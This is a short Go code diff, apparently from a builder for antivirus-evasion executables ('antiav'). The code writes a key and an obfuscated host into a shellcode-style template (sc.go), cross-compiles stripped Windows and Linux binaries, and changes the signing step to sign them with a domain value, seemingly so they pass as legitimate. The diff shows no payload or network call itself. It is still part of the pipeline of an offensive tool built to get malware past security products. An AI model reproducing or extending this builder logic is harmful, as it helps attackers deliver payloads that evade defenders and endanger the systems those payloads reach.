@@ -57,6 +57,7 @@ func (c *config) buildCode(key []byte) error {
 		return err
 	}
 	code := bytes.ReplaceAll(sc, []byte("{{CODE}}"), key)
+	code = bytes.ReplaceAll(code, []byte("{{HOST_OBFUSCATOR}}"), []byte(c.hostObfuscator))
 	if err := ioutil.WriteFile("sc.go", code, 0755); err != nil {
 		return err
 	}
@@ -69,7 +70,7 @@ func (c *config) buildCode(key []byte) error {
 			return err
 		}
 		os.Remove("resource_windows.syso")
-		utils.SignExecutable(c.sign, "../antiav_windows_386.exe")
+		utils.SignExecutable(c.domain, "../antiav_windows_386.exe")
 
 		utils.CreateIcoPropertity("amd64")
 		cmd = fmt.Sprintf(`CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH="amd64" go build -ldflags "%s" -trimpath -o "../antiav_windows_amd64.exe"`, ldflag)
@@ -77,13 +78,13 @@ func (c *config) buildCode(key []byte) error {
 			return err
 		}
 		os.Remove("resource_windows.syso")
-		utils.SignExecutable(c.sign, "../antiav_windows_amd64.exe")
+		utils.SignExecutable(c.domain, "../antiav_windows_amd64.exe")
 	case "linux":
 		cmd := `CGO_ENABLED=1 GOOS=linux GOARCH="amd64" go build -ldflags "-w -s" -trimpath -o "../antiav_linux_amd64"`
 		if err := c.cmd(cmd); err != nil {
 			return err
 		}
-		utils.SignExecutable(c.sign, "../antiav_linux_amd64")
+		utils.SignExecutable(c.domain, "../antiav_linux_amd64")
 	}
 
 	return nil
